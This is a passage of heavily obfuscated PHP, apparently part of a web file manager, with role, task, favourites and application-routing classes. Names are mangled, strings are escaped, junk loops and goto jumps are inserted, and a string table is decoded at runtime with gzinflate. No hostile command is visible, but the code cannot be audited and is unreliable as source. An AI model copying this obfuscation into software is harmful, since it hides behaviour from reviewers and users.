$ø®ïÔ¢­ =& $_SERVER[¤øïŠ‹²]; if ($this->PDOStatement) { $Õ”³¿¤Ë = $this->PDOStatement->errorInfo(); $this->error = $Õ”³¿¤Ë[1] . $ø®ïÔ¢­[4] . $Õ”³¿¤Ë[2]; } else { $this->error = $ø®ïÔ¢­[12]; } if ($ø®ïÔ¢­[12] != $this->queryStr) { $this->error .= LNG($ø®ïÔ¢­[48]) . $this->queryStr; } think_trace($this->error, $ø®ïÔ¢­[12], $ø®ïÔ¢­[49]); return $this->error; } public function escapeString($ÄÁÃ×) { $ïàêæ«ı =& $_SERVER[¤øïŠ‹²]; switch ($this->dbType) { case $ïàêæ«ı[1060]: case $ïàêæ«ı[1033]: case $ïàêæ«ı[1051]: case $ïàêæ«ı[1063]: return addslashes($ÄÁÃ×); case $ïàêæ«ı[1035]: case $ïàêæ«ı[1052]: case $ïàêæ«ı[1034]: case $ïàêæ«ı[1036]: return str_ireplace($ïàêæ«ı[68], $ïàêæ«ı[69], $ÄÁÃ×); } } protected function parseValue($ñ¡íúÎ) { $˜ÚŞŞı =& $_SERVER[¤øïŠ‹²]; if (is_string($ñ¡íúÎ)) { $ÀÍÓŞØÅ = strpos($ñ¡íúÎ, $˜ÚŞŞı[4]) === 0 && in_array($ñ¡íúÎ, array_keys($this->bind)); $ñ¡íúÎ = $ÀÍÓŞØÅ ? $this->escapeString($ñ¡íúÎ) : $˜ÚŞŞı[1073] . $this->escapeString($ñ¡íúÎ) . $˜ÚŞŞı[1073]; } elseif (isset($ñ¡íúÎ[0]) && is_string($ñ¡íúÎ[0]) && strtolower($ñ¡íúÎ[0]) == $˜ÚŞŞı[384]) { $ñ¡íúÎ = $this->escapeString($ñ¡íúÎ[1]); } elseif (is_array($ñ¡íúÎ)) { $ñ¡íúÎ = array_map(array($this, $˜ÚŞŞı[1074]), $ñ¡íúÎ); } elseif (is_bool($ñ¡íúÎ)) { $ñ¡íúÎ = $ñ¡íúÎ ? $˜ÚŞŞı[102] : $˜ÚŞŞı[241]; } elseif (is_null($ñ¡íúÎ)) { $ñ¡íúÎ = $˜ÚŞŞı[115]; } return $ñ¡íúÎ; } public function getLastInsertId() { $İå‹‰Š =& $_SERVER[¤øïŠ‹²]; switch ($this->dbType) { case $İå‹‰Š[1060]: case $İå‹‰Š[1052]: case $İå‹‰Š[1033]: case $İå‹‰Š[1051]: case $İå‹‰Š[1035]: case $İå‹‰Š[1063]: return $this->_linkID->lastInsertId(); case $İå‹‰Š[1034]: case $İå‹‰Š[1036]: $“¨í¬ì = $this->table; $«§°‘Š = $this->query("\123\x45\x4c\x45\103\124\x20{$“¨í¬ì}\56\x63\165\x72\x72\166\x61\x6c\x20\143\x75\x72\162\166\x61\154\x20\x46\x52\117\x4d\40\144\165\141\x6c"); return $«§°‘Š ? $«§°‘Š[0][$İå‹‰Š[1075]] : 0; } } } goto eÓ‘“è³·¹; dÚóêĞêÃ: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\56\x72\x6f\154\145\x4c\151\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\141\x75\x74\x68", "\x6c\141\x62\x65\x6c", "\144\151\163\x70\154\141\x79", "\163\171\x73\x74\x65\x6d", "\x64\x65\163\x63", "\151\x67\x6e\157\x72\145\x45\x78\164", "\151\147\x6e\157\x72\x65\106\x69\x6c\145\123\x69\172\145", "\x61\144\155\x69\156\151\163\x74\x72\x61\x74\157\162", "\x73\x6f\x72\x74"); public function listData($ø—Ô¼Ã½ = false, $ÃÚ¦Ú• = "\163\157\162\164", $ª­œÛøÚ = false) { $¹¼·áœ² =& $_SERVER[¤øïŠ‹²]; $Ö¢¹¯ã = parent::listData($ø—Ô¼Ã½, $ÃÚ¦Ú•, $ª­œÛøÚ); if (!$ø—Ô¼Ã½) { foreach ($Ö¢¹¯ã as $¼»Ğ”¤ => $à»Œ©Ã) { if ($à»Œ©Ã[$¹¼·áœ²[2324]] == 1) { $Ö¢¹¯ã[$¼»Ğ”¤][$¹¼·áœ²[546]] = LNG($¹¼·áœ²[2615]); } } } return $Ö¢¹¯ã; } public function update($ëÆÔ•Œø, $‘¼ÒîÂ) { $ËÜ§Á‚µ =& $_SERVER[¤øïŠ‹²]; $“ˆõ­¢Æ = parent::listData($ëÆÔ•Œø); $‡äßÚú = $this->findByName($‘¼ÒîÂ[$ËÜ§Á‚µ[32]]); if (!$“ˆõ­¢Æ || $‡äßÚú && $‡äßÚú[$ËÜ§Á‚µ[493]] != $“ˆõ­¢Æ[$ËÜ§Á‚µ[493]]) { return !1; } if ($‡äßÚú[$ËÜ§Á‚µ[2324]] == 1) { $‘¼ÒîÂ = array($ËÜ§Á‚µ[32] => $‘¼ÒîÂ[$ËÜ§Á‚µ[32]], $ËÜ§Á‚µ[2152] => $‘¼ÒîÂ[$ËÜ§Á‚µ[2152]]); } $this->filterAuth($‘¼ÒîÂ[$ËÜ§Á‚µ[508]]); return parent::update($ëÆÔ•Œø, $‘¼ÒîÂ); } public function remove($Ë¬Äõ) { $Ï½‰í¼÷ = parent::listData($Ë¬Äõ); if (!$Ï½‰í¼÷ || $Ï½‰í¼÷[$_SERVER[¤øïŠ‹²][202]]) { return !1; } return parent::remove($Ë¬Äõ); } public function add($ö¡İ—Ùı) { $¨««şè =& $_SERVER[¤øïŠ‹²]; $‚ùö¢î§ = $ö¡İ—Ùı[$¨««şè[32]]; if ($this->findByName($‚ùö¢î§)) { return !1; } $ıİ¥Òü = array($¨««şè[515] => $‚ùö¢î§, $¨««şè[2137] => $¨««şè[12], $¨««şè[2133] => $¨««şè[2141], $¨««şè[2616] => 1, $¨««şè[2136] => 0, $¨««şè[2617] => 0, $¨««şè[2135] => $this->getSort()); $ö¡İ—Ùı = array_merge($ıİ¥Òü, $ö¡İ—Ùı); $this->filterAuth($ö¡İ—Ùı[$¨««şè[508]]); return parent::insert($ö¡İ—Ùı); } private function getSort() { $¬¾ªŠ–Ò =& $_SERVER[¤øïŠ‹²]; $¿Ğ¥Ëª³ = parent::listData(); $‰×É­¼× = array_to_keyvalue($¿Ğ¥Ëª³, $¬¾ªŠ–Ò[12], $¬¾ªŠ–Ò[2153]); return empty($‰×É­¼×) ? 0 : max($‰×É­¼×) + 1; } private function filterAuth(&$ÜºŒñ™™) { $é—¨íÄ¼ =& $_SERVER[¤øïŠ‹²]; $Š…Êª¤’ = array(); $¦ÑË÷Í³ = array_filter(explode($é—¨íÄ¼[50], $ÜºŒñ™™)); foreach ($¦ÑË÷Í³ as $ÜºŒñ™™) { $¡¯¦ÒüÃ = explode($é—¨íÄ¼[10], $ÜºŒñ™™); if ($¡¯¦ÒüÃ[0] == $é—¨íÄ¼[2618] && $¡¯¦ÒüÃ[1] != $é—¨íÄ¼[1255]) { $¹é˜¹ù = $¡¯¦ÒüÃ[0] . $é—¨íÄ¼[10] . $¡¯¦ÒüÃ[1] . $é—¨íÄ¼[2619]; if (!in_array($¹é˜¹ù, $¦ÑË÷Í³)) { $Š…Êª¤’[] = $¹é˜¹ù; } } $Š…Êª¤’[] = $ÜºŒñ™™; } $ÜºŒñ™™ = implode($é—¨íÄ¼[50], $Š…Êª¤’); } public function findRoleDefault() { $ş×Çœ  =& $_SERVER[¤øïŠ‹²]; $øíß¶ãÅ = parent::listData(); $íŒÉÍøŞ = !1; foreach ($øíß¶ãÅ as $çÒì½ÚŞ) { if (!$çÒì½ÚŞ || $çÒì½ÚŞ[$ş×Çœ [2151]] == $ş×Çœ [241] || $çÒì½ÚŞ[$ş×Çœ [2324]] == 1) { continue; } if (strstr($çÒì½ÚŞ[$ş×Çœ [508]], $ş×Çœ [2620])) { continue; } if (!strstr($çÒì½ÚŞ[$ş×Çœ [508]], $ş×Çœ [2621])) { continue; } if (!$íŒÉÍøŞ) { $íŒÉÍøŞ = $çÒì½ÚŞ; continue; } $şÔåÃÕ® = explode($ş×Çœ [50], $íŒÉÍøŞ[$ş×Çœ [508]]); $¯«­Õ = explode($ş×Çœ [50], $çÒì½ÚŞ[$ş×Çœ [508]]); if (count($şÔåÃÕ®) > count($¯«­Õ)) { $íŒÉÍøŞ = $çÒì½ÚŞ; } } return $íŒÉÍøŞ ? $íŒÉÍøŞ[$ş×Çœ [493]] : $ş×Çœ [12]; } public function sort($È‹§£«Ã, $š¡‹¹Ö) { return parent::update($È‹§£«Ã, $š¡‹¹Ö); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\164\141\x73\x6b\x4c\x69\x73\164"; public $field = array("\156\x61\x6d\145", "\x74\x79\160\x65", "\x65\x76\145\x6e\x74", "\x74\x69\x6d\145", "\144\x65\163\143", "\x73\171\x73\x74\x65\x6d", "\x65\x6e\141\x62\x6c\x65", "\x6c\x61\163\164\x52\165\x6e", "\x73\157\x72\x74"); public function listData($Áš£÷œ„ = false, $ÊÓôƒÂ = "\x73\157\x72\164", $à£ÛŠéÍ = false) { return parent::listData($Áš£÷œ„, $ÊÓôƒÂ, $à£ÛŠéÍ); } public function add($—êÒ­ÏŸ) { $’«Â¤’« =& $_SERVER[¤øïŠ‹²]; $ÕÎ¶ùªş = $this->findByName($—êÒ­ÏŸ[$’«Â¤’«[32]]); if ($ÕÎ¶ùªş) { return !1; } $—êÒ­ÏŸ[$’«Â¤’«[1876]] = 0; $—êÒ­ÏŸ[$’«Â¤’«[2153]] = $this->getSort(); return parent::insert($—êÒ­ÏŸ); } private function getSort() { $–©ºÁ… =& $_SERVER[¤øïŠ‹²]; $ß‚÷Ì³… = parent::listData(); $¶Œù€Ë¥ = array_to_keyvalue($ß‚÷Ì³…, $–©ºÁ…[12], $–©ºÁ…[2153]); return empty($¶Œù€Ë¥) ? 0 : max($¶Œù€Ë¥) + 1; } public function update($½¾ÆÈ¿á, $½ÀíÓæ«) { $½ë“¿¡¾ =& $_SERVER[¤øïŠ‹²]; $·¾ı°í  = $this->listData($½¾ÆÈ¿á); $îŞã‘‚Ï = $this->findByName($½ÀíÓæ«[$½ë“¿¡¾[32]]); if (!$·¾ı°í  || $îŞã‘‚Ï && $îŞã‘‚Ï[$½ë“¿¡¾[493]] != $·¾ı°í [$½ë“¿¡¾[493]]) { return !1; } return parent::update($½¾ÆÈ¿á, $½ÀíÓæ«); } public function remove($ËøÏïàÙ, $Ÿë¦Ÿæ€ = false) { $Õ¡¬Ô´¡ =& $_SERVER[¤øïŠ‹²]; $¿Ú•Î±ï = $this->listData($ËøÏïàÙ); if (!$¿Ú•Î±ï) { return; } if (!$Ÿë¦Ÿæ€ && $¿Ú•Î±ï[$Õ¡¬Ô´¡[202]] == $Õ¡¬Ô´¡[102]) { return !1; } return parent::remove($ËøÏïàÙ); } public function enable($—¯Ü˜‘å, $İ­ãöÜÊ) { return $this->update($—¯Ü˜‘å, array($_SERVER[¤øïŠ‹²][2610] => $İ­ãöÜÊ)); } public function run($ÊÓ±–) { return $this->update($ÊÓ±–, array($_SERVER[¤øïŠ‹²][2622] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\x66\x61\x76"; protected function cacheFunctionAlias($üºêÄ€í) { $äãÂ ¯í =& $_SERVER[¤øïŠ‹²]; return array($äãÂ ¯í[2243] => array(USER_ID, $äãÂ ¯í[2623])); } protected function ___listData() { $¤áÒ·²ã =& $_SERVER[¤øïŠ‹²]; $‚ş³ÂÙ§ = array($¤áÒ·²ã[1916] => USER_ID, $¤áÒ·²ã[579] => 0); $—†æÔ®­ = $¤áÒ·²ã[2624]; $üà•å³š = $this->field($—†æÔ®­)->where($‚ş³ÂÙ§)->order($¤áÒ·²ã[2625])->select(); return $üà•å³š ? $üà•å³š : array(); } protected function resetCache() { } protected function listView() { $‚©Í”§ =& $_SERVER[¤øïŠ‹²]; $’± à› = $this->listData(); $¼á½•µï = array_filter_by_field($’± à›, $‚©Í”§[33], $‚©Í”§[511]); $ˆíñıÚÊ = array_to_keyvalue($¼á½•µï, $‚©Í”§[12], $‚©Í”§[98]); if (!$ˆíñıÚÊ) { return $’± à›; } $ã–ş›İ¯ = 2000; $ªòÇ‰ = array($‚©Í”§[512] => array($‚©Í”§[513], $ˆíñıÚÊ)); $¸–“¼‘¢ = Model($‚©Í”§[934])->listSource($ªòÇ‰, $ã–ş›İ¯); $¸–“¼‘¢ = array_merge($¸–“¼‘¢[$‚©Í”§[97]], $¸–“¼‘¢[$‚©Í”§[96]]); $¸–“¼‘¢ = array_to_keyvalue($¸–“¼‘¢, $‚©Í”§[204]); foreach ($’± à› as $¨ı´œ·£ => $¦‹Ü¡ãŞ) { $„Ûìú½‹ = $¸–“¼‘¢[$¦‹Ü¡ãŞ[$‚©Í”§[98]]]; $„Ûìú½‹ = $„Ûìú½‹ ? $„Ûìú½‹ : array(); $’± à›[$¨ı´œ·£] = array_merge($„Ûìú½‹, $¦‹Ü¡ãŞ); } return $’± à›; } protected function addFav($ÔÙÂ°±Ï, $ÍÚı‰–• = '', $èÖíæğç = "\x73\x6f\x75\162\143\145") { $ñ´šïò® =& $_SERVER[¤øïŠ‹²]; $›õ¸°· = array($ñ´šïò®[1916] => USER_ID, $ñ´šïò®[579] => 0, $ñ´šïò®[517] => $èÖíæğç, $ñ´šïò®[516] => $ÔÙÂ°±Ï); if ($this->where($›õ¸°·)->find()) { return !1; } $›õ¸°· = array($ñ´šïò®[1916] => USER_ID, $ñ´šïò®[579] => 0); $Á÷ËÒ…³ = $this->where($›õ¸°·)->max($ñ´šïò®[2153]); if (!$Á÷ËÒ…³) { $Á÷ËÒ…³ = 0; } if (!$ÍÚı‰–• && $èÖíæğç == $ñ´šïò®[511]) { $‹òœêŞ = Model($ñ´šïò®[1482])->where(array($ñ´šïò®[512] => $ÔÙÂ°±Ï))->find(); if (!$‹òœêŞ) { return !1; } $ÍÚı‰–• = $‹òœêŞ[$ñ´šïò®[32]]; } $ÍÚı‰–• = $this->getAutoName($ÍÚı‰–•); $äÍËò = array($ñ´šïò®[1916] => USER_ID, $ñ´šïò®[579] => 0, $ñ´šïò®[515] => $ÍÚı‰–•, $ñ´šïò®[516] => $ÔÙÂ°±Ï, $ñ´šïò®[517] => $èÖíæğç, $ñ´šïò®[2135] => $Á÷ËÒ…³ + 1); return $this->add($äÍËò); } protected function remove($ú“³‡¶Å) { $Ğ¶ê¦îì =& $_SERVER[¤øïŠ‹²]; $¶æ¢¢Ì« = array($Ğ¶ê¦îì[1916] => USER_ID, $Ğ¶ê¦îì[514] => $ú“³‡¶Å); return $this->where($¶æ¢¢Ì«)->delete(); } protected function removeByName($ÕÓ¿’‚â) { $¤ø°Õµ  =& $_SERVER[¤øïŠ‹²]; $¿ã¶Ùüß = array($¤ø°Õµ [1916] => USER_ID, $¤ø°Õµ [515] => $ÕÓ¿’‚â, $¤ø°Õµ [579] => 0); return $this->where($¿ã¶Ùüß)->delete(); } protected function rename($²º¹…ı°, $Âºİ—õø) { $Ò¿’Ûç• =& $_SERVER[¤øïŠ‹²]; if ($²º¹…ı° == $Âºİ—õø) { return !1; } $İÊ¥Ñ” = $this->getAutoName($Âºİ—õø); if ($Âºİ—õø != $İÊ¥Ñ”) { return !1; } $¹Û±¯Ğì = array($Ò¿’Ûç•[1916] => USER_ID, $Ò¿’Ûç•[579] => 0, $Ò¿’Ûç•[32] => $²º¹…ı°); return $this->where($¹Û±¯Ğì)->save(array($Ò¿’Ûç•[32] => $Âºİ—õø)); } protected function resetSort($ÚÕÓÆú±) { $¦¥µÓù· =& $_SERVER[¤øïŠ‹²]; $ÚÕÓÆú± = is_array($ÚÕÓÆú±) ? $ÚÕÓÆú± : array(); $‚œÑóëâ = array($¦¥µÓù·[1916] => USER_ID); for ($€¦²ÎËõ = 0; $€¦²ÎËõ < count($ÚÕÓÆú±); $€¦²ÎËõ++) { $‚œÑóëâ[$¦¥µÓù·[514]] = $ÚÕÓÆú±[$€¦²ÎËõ]; $this->where($‚œÑóëâ)->save(array($¦¥µÓù·[2135] => $€¦²ÎËõ + 1)); } return !0; } protected function moveTop($£²Œ°í) { $§¬ÚšÍæ =& $_SERVER[¤øïŠ‹²]; $ïœü÷šï = array($§¬ÚšÍæ[1916] => USER_ID, $§¬ÚšÍæ[579] => 0); $ÉÂ¯ô½ = $this->where($ïœü÷šï)->where(array($§¬ÚšÍæ[32] => $£²Œ°í))->find(); if (!$ÉÂ¯ô½) { return; } $“Ò¢Â†Ú = $this->field($§¬ÚšÍæ[493])->where($ïœü÷šï)->order($§¬ÚšÍæ[2625])->select(); $“Ò¢Â†Ú = array_to_keyvalue($“Ò¢Â†Ú, $§¬ÚšÍæ[12], $§¬ÚšÍæ[493]); $µÑƒŒéÈ = $“Ò¢Â†Ú; $“Ò¢Â†Ú = array_remove_value($“Ò¢Â†Ú, $ÉÂ¯ô½[$§¬ÚšÍæ[493]]); array_unshift($“Ò¢Â†Ú, $ÉÂ¯ô½[$§¬ÚšÍæ[493]]); return $this->resetSort($“Ò¢Â†Ú); } protected function moveBottom($èı„§üÍ) { $µ¤äÄá¦ =& $_SERVER[¤øïŠ‹²]; $¬Èòà½Á = array($µ¤äÄá¦[1916] => USER_ID, $µ¤äÄá¦[579] => 0); $ŞëÄ£ËĞ = $this->where($¬Èòà½Á)->max($µ¤äÄá¦[2153]); $ªŠ°ß¿„ = array($µ¤äÄá¦[2153] => $ŞëÄ£ËĞ + 1); return $this->where($¬Èòà½Á)->where(array($µ¤äÄá¦[32] => $èı„§üÍ))->save($ªŠ°ß¿„); } private function getAutoName($ªƒ’÷Î) { $Ùú˜ù’¦ =& $_SERVER[¤øïŠ‹²]; $¤›ä®—î = array($Ùú˜ù’¦[1916] => USER_ID, $Ùú˜ù’¦[579] => 0); $¬Óß‘èì = $this->field($Ùú˜ù’¦[32])->where($¤›ä®—î)->select(); $¬Óß‘èì = array_to_keyvalue($¬Óß‘èì, $Ùú˜ù’¦[12], $Ùú˜ù’¦[32]); if (!$¬Óß‘èì || !in_array($ªƒ’÷Î, $¬Óß‘èì)) { return $ªƒ’÷Î; } for ($Ù®£¸— = 0; $Ù®£¸— < count($¬Óß‘èì); $Ù®£¸—++) { if (!in_array($ªƒ’÷Î . "\50{$Ù®£¸—}\51", $¬Óß‘èì)) { return $ªƒ’÷Î . "\x28{$Ù®£¸—}\x29"; } } return $ªƒ’÷Î . "\50{$Ù®£¸—}\x29"; } } goto E’‹…¥ğƒÃ; aåï‹¶Š©’: $_SERVER[Ôêåã] = explode($_SERVER[¤øïŠ‹²][710], gzinflate(substr($_SERVER[¤øïŠ‹²][711], 10, -8))); $ozbsgjrydc = $_SERVER[¤øïŠ‹²][712]; class Application { private $defaultModule = "\x69\x6e\x64\145\x78"; private $defaultController = "\151\156\x64\x65\170"; private $defaultAction = "\151\156\144\145\x78"; function __construct() { } public function setDefault($Ÿø£íÔÄ) { $õæŞæ¨ =& $_SERVER[¤øïŠ‹²]; $ ¤¸¥½š =& $_SERVER[Ôêåã]; $Èãµ¤˜È = explode($ ¤¸¥½š[0], trim($Ÿø£íÔÄ, $ ¤¸¥½š[0])); $µŠÇ¢Ñ = $õæŞæ¨[713]; while (strlen($µŠÇ¢Ñ) < $õæŞæ¨[714]) { if (!$µŠÇ¢Ñ) { break; } $µŠÇ¢Ñ++; } $this->defaultModule = $Èãµ¤˜È[0] ? $Èãµ¤˜È[0] : $this->defaultModule; $œÅ¯¯£Ú = $õæŞæ¨[715]; while (strlen($œÅ¯¯£Ú) < $õæŞæ¨[716]) { if (!$œÅ¯¯£Ú) { break; } $œÅ¯¯£Ú++; } $this->defaultController = $Èãµ¤˜È[1] ? $Èãµ¤˜È[1] : $this->defaultController; $this->defaultAction = $Èãµ¤˜È[2] ? $Èãµ¤˜È[2] : $this->defaultAction; $this->omqp648864f0($ ¤¸¥½š[1], array($this, $ ¤¸¥½š[2])); } public function appRun($õÈ™äçŒ) { $ìÍ‚ãªô =& $_SERVER[¤øïŠ‹²]; $Óæ¡’È =& $_SERVER[Ôêåã]; $Ê±ÚÄ­› = explode($Óæ¡’È[0], $õÈ™äçŒ); $‰ãĞÌ×Â = $ìÍ‚ãªô[717]; $Éû°ËÚ = strtolower($Ê±ÚÄ­›[0]); $‰Ôò…‰¾ = $Óæ¡’È[3]; $ÏñîÈşã = $ìÍ‚ãªô[718]; if (!$ÏñîÈşã) { return; } if ($Éû°ËÚ == $Óæ¡’È[4]) { $‰Ôò…‰¾ = $Óæ¡’È[5]; $Ê±ÚÄ­›[0] = $Óæ¡’È[6]; $Ê±ÚÄ­›[1] = $Ê±ÚÄ­›[1] . $Óæ¡’È[7]; $õÈ™äçŒ = join($Óæ¡’È[0], $Ê±ÚÄ­›); $õÈ™äçŒ = trim($õÈ™äçŒ, $Óæ¡’È[0]); } call_user_func(array($Óæ¡’È[8], $Óæ¡’È[9]), $‰Ôò…‰¾ . $Óæ¡’È[10], $õÈ™äçŒ); ActionCall($õÈ™äçŒ); $ ÈàÈçŸ = $ìÍ‚ãªô[719]; if (!$ ÈàÈçŸ) { die; } call_user_func(array($Óæ¡’È[8], $Óæ¡’È[9]), $‰Ôò…‰¾ . $Óæ¡’È[11], $õÈ™äçŒ); $×†Ùìí¼ = $ìÍ‚ãªô[720]; } private function autorun() { $²˜Ê›¯š =& $_SERVER[¤øïŠ‹²]; $Ÿ«ÄØ¾ş =& $_SERVER[Ôêåã]; global $config; $ë•Œ“ğ¦ = $²˜Ê›¯š[721]; if (strlen($ë•Œ“ğ¦) < $²˜Ê›¯š[714]) { die; } if (count($config[$Ÿ«ÄØ¾ş[12]]) == 0) { return; } foreach ($config[$Ÿ«ÄØ¾ş[12]] as $¯²ßƒ² => $£¼÷À÷û) { $this->appRun($£¼÷À÷û); } } private function laisf29bc7d7() { $è¬¾ µû =& $_SERVER[¤øïŠ‹²]; $“¦ôó¬‹ =& $_SERVER[Ôêåã]; $Ë›Øú¡¼ = $“¦ôó¬‹[4]; $ãÁœ— = $GLOBALS[$“¦ôó¬‹[13]][$“¦ôó¬‹[14]][0]; if (!$ãÁœ— || strlen($ãÁœ—) <= strlen($Ë›Øú¡¼)) { return; } if (strtolower(substr($ãÁœ—, -strlen($Ë›Øú¡¼))) != $Ë›Øú¡¼) { return; } $ºï©èŒ÷ = substr($ãÁœ—, 0, -strlen($Ë›Øú¡¼)); $¢óì¹– = $è¬¾ µû[722]; $ÈòÒÛ„Õ = array($“¦ôó¬‹[4], $ºï©èŒ÷); $€±–±üÏ = $è¬¾ µû[723]; while (strlen($€±–±üÏ) < $è¬¾ µû[716]) { if (!$€±–±üÏ) { break; } $€±–±üÏ++; } $¦”Î”š = array_slice($GLOBALS[$“¦ôó¬‹[13]][$“¦ôó¬‹[14]], 1); $Æœ·“ì = $è¬¾ µû[724]; if (strlen($Æœ·“ì) < $è¬¾ µû[714]) { return; } $GLOBALS[$“¦ôó¬‹[13]][$“¦ôó¬‹[14]] = array_merge($ÈòÒÛ„Õ, $¦”Î”š); $GLOBALS[$“¦ôó¬‹[13]][$“¦ôó¬‹[15]] = implode($“¦ôó¬‹[0], $GLOBALS[$“¦ôó¬‹[13]][$“¦ôó¬‹[14]]); $š¸ÆÃüË = $è¬¾ µû[725]; if (!$š¸ÆÃüË) { return; } } private function npud31b9fd0c() { $‹«Ô±»è =& $_SERVER[¤øïŠ‹²]; $Ù‘¡‹Ÿ =& $_SERVER[Ôêåã]; if ($GLOBALS[$Ù‘¡‹Ÿ[13]][$Ù‘¡‹Ÿ[15]] != $Ù‘¡‹Ÿ[6]) { return; } $Š­¬ıÜÃ = $_SERVER[$Ù‘¡‹Ÿ[16]]; $Å×€ÅçĞ = $‹«Ô±»è[726]; while (strlen($Å×€ÅçĞ) < $‹«Ô±»è[727]) { if (!$Å×€ÅçĞ) { break; } $Å×€ÅçĞ++; } $àÏÚÔ×± = $Ù‘¡‹Ÿ[17]; if (!strstr($Š­¬ıÜÃ, $àÏÚÔ×±)) { return; } $µä˜œşŠ = strrpos($Š­¬ıÜÃ, $àÏÚÔ×±); $Ü–ĞíÁ‹ = $‹«Ô±»è[728]; if (!$Ü–ĞíÁ‹) { die; } $ÎÁç¥ = substr($Š­¬ıÜÃ, $µä˜œşŠ + strlen($àÏÚÔ×±)); $ÀÂ³…ì = $‹«Ô±»è[729]; while ($ÀÂ³…ì < $‹«Ô±»è[714]) { if ($ÀÂ³…ì >= 0) { break; } $ÀÂ³…ì++; } preg_match_all($Ù‘¡‹Ÿ[18], $ÎÁç¥, $ÕÈÑ¤µ); $µøçªéÙ = $‹«Ô±»è[730]; if (!$µøçªéÙ) { die; } $ÎÁç¥ = trim($ÕÈÑ¤µ[0][0], $Ù‘¡‹Ÿ[19]); $GLOBALS[$Ù‘¡‹Ÿ[13]][$Ù‘¡‹Ÿ[14]] = explode($Ù‘¡‹Ÿ[19], $ÎÁç¥); $Ò‰ü— = $‹«Ô±»è[731]; $GLOBALS[$Ù‘¡‹Ÿ[13]][$Ù‘¡‹Ÿ[15]] = implode($Ù‘¡‹Ÿ[0], $GLOBALS[$Ù‘¡‹Ÿ[13]][$Ù‘¡‹Ÿ[14]]); } public function run() { $Şü‘”øò =& $_SERVER[¤øïŠ‹²]; $ñ‚àË•ô =& $_SERVER[Ôêåã]; $this->npud31b9fd0c(); $this->laisf29bc7d7(); $‰üÜÕäÍ = $Şü‘”øò[732]; if (strlen($‰üÜÕäÍ) < $Şü‘”øò[60]) { return; } $Ô¥ü»Šş = $GLOBALS[$ñ‚àË•ô[13]][$ñ‚àË•ô[14]]; $­£œ“§Ü = $GLOBALS[$ñ‚àË•ô[13]][$ñ‚àË•ô[15]]; $ŠêƒïèÛ = $Şü‘”øò[733]; define($ñ‚àË•ô[20], isset($Ô¥ü»Šş[0]) && $Ô¥ü»Šş[0] ? $Ô¥ü»Šş[0] : $this->defaultModule); $¾«¡Ìû¨ = $Şü‘”øò[734]; if (!$¾«¡Ìû¨) { die; } define($ñ‚àË•ô[21], isset($Ô¥ü»Šş[1]) && $Ô¥ü»Šş[0] ? $Ô¥ü»Šş[1] : $this->defaultController); define($ñ‚àË•ô[22], isset($Ô¥ü»Šş[2]) && $Ô¥ü»Šş[0] ? $Ô¥ü»Šş[2] : $this->defaultAction); $Ç•º¯³ = $Şü‘”øò[735]; while ($Ç•º¯³ < $Şü‘”øò[709]) { if ($Ç•º¯³ >= 0) { break; } $Ç•º¯³++; } define($ñ‚àË•ô[23], MOD . $ñ‚àË•ô[0] . ST . $ñ‚àË•ô[0] . ACT); $ßíÜÌş = $Şü‘”øò[736]; $_SERVER[$ñ‚àË•ô[24]] = strtolower(ACTION); $ò‡“™„ = $Şü‘”øò[737]; $this->autorun(); $ßèÌ½¿ = $Şü‘”øò[738]; if (strlen($ßèÌ½¿) < $Şü‘”øò[727]) { return; } if (count($Ô¥ü»Šş) >= 3) { $this->appRun($­£œ“§Ü); } else { $this->appRun(ACTION); } } private $nkpu6f387026 = array(); private $rghxbd9bc189 = ''; public function ohuc4c88f36d() { $èäÏ…ì =& $_SERVER[¤øïŠ‹²]; $Òõî¯§ =& $_SERVER[Ôêåã]; $this->nchdd7cbb424(); $this->cfxm1a3baa01(); $ ü°ÄÌ = $èäÏ…ì[739]; $this->qikbd690f186(); $this->wcugd5a5b1ee(); $ë†¼è“‹ = $èäÏ…ì[740]; while (strlen($ë†¼è“‹) < $èäÏ…ì[709]) { if (!$ë†¼è“‹) { break; } $ë†¼è“‹++; } $this->hlkmd3b24ebf(); $ôÄ¡ùİÙ = $èäÏ…ì[741]; while ($ôÄ¡ùİÙ < $èäÏ…ì[60]) { if ($ôÄ¡ùİÙ >= 0) { break; } $ôÄ¡ùİÙ++; } $this->mgst05d6430e(); $this->egrc2f536322(); $Çéªí˜Å = $èäÏ…ì[742]; $this->omqp648864f0($Òõî¯§[25], array($this, $Òõî¯§[26])); $Ğì†ÁóÁ = $èäÏ…ì[743]; while (strlen($Ğì†ÁóÁ) < $èäÏ…ì[716]) { if (!$Ğì†ÁóÁ) { break; } $Ğì†ÁóÁ++; } $this->omqp648864f0($Òõî¯§[27], array($this, $Òõî¯§[28])); $â«ÑœÀ¶ = $èäÏ…ì[744]; if (!$â«ÑœÀ¶) { die; } $this->omqp648864f0($Òõî¯§[29], array($this, $Òõî¯§[30])); $this->omqp648864f0($Òõî¯§[31], array($this, $Òõî¯§[32])); $µåÉ™‡ = $èäÏ…ì[745]; } public function getVersionData() { $×Ôíü¢ =& $_SERVER[¤øïŠ‹²]; return $this->nkpu6f387026; $ÀŠßõ = $×Ôíü¢[746]; while ($ÀŠßõ < $×Ôíü¢[716]) { if ($ÀŠßõ >= 0) { break; } $ÀŠßõ++; } } public function vwgh0639fdd9($á¨÷ÅÎ£) { $…ĞÅú™² =& $_SERVER[¤øïŠ‹²]; $Î‰‡ŞİÊ =& $_SERVER[Ôêåã]; $Ì¯Şì• = Model($Î‰‡ŞİÊ[33])->get(); $˜óÀ•õÊ = array($Î‰‡ŞİÊ[34], $Î‰‡ŞİÊ[35], $Î‰‡ŞİÊ[36], $Î‰‡ŞİÊ[37], $Î‰‡ŞİÊ[38], $Î‰‡ŞİÊ[39], $Î‰‡ŞİÊ[40], $Î‰‡ŞİÊ[41], $Î‰‡ŞİÊ[42], $Î‰‡ŞİÊ[43], $Î‰‡ŞİÊ[44], $Î‰‡ŞİÊ[45], $Î‰‡ŞİÊ[46], $Î‰‡ŞİÊ[47], $Î‰‡ŞİÊ[48], $Î‰‡ŞİÊ[49], $Î‰‡ŞİÊ[50], $Î‰‡ŞİÊ[51], $Î‰‡ŞİÊ[52], $Î‰‡ŞİÊ[53], $Î‰‡ŞİÊ[54], $Î‰‡ŞİÊ[55], $Î‰‡ŞİÊ[56], $Î‰‡ŞİÊ[57], $Î‰‡ŞİÊ[58], 